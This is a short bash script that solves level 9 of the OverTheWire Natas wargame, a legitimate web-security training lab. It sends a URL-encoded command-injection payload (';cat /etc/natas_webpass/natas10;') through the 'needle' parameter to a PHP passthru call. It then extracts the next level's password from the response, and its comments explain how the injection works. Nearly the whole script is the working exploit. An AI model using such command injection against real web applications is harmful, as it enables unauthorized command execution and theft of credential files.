#!/bin/bash
if [ $# -eq 0 ]
  then echo "Please pass the password as argument"
  exit
fi
# The passthru command in php executes a shell command
# Since it's not escaped, we can insert anything we want and execute it
# You could fiddle with the grep command and do something like:
# -v $(echo password) /etc/natas_webpass/natas10 #
# But the easiest is probably to just insert a semi colon and start a new command


# comm=';cat /etc/natas_webpass/natas10;'
comm='%3Bcat+%2Fetc%2Fnatas_webpass%2Fnatas10%3B'
answer=`curl -s --user natas9:$1 "http://natas9.natas.labs.overthewire.org/?needle=$comm" | grep -E -o '^[[:alnum:]]{32}'`
echo The password for natas10 is $answer
